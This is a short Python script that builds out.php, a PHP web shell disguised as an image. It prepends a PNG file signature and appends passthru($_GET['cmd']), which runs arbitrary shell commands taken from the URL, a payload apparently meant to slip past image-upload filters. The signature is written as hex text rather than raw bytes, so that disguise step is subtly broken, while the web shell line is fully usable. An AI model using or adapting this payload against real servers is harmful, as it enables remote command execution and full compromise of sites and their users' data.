png = "89 50 4e 47 0d 0a 1a 0a".replace(" ", "")
e = "<?php    passthru($_GET['cmd']); ?>"

with open('out.php', 'wb') as f:
    f.write(png.encode())
    f.write(e.encode())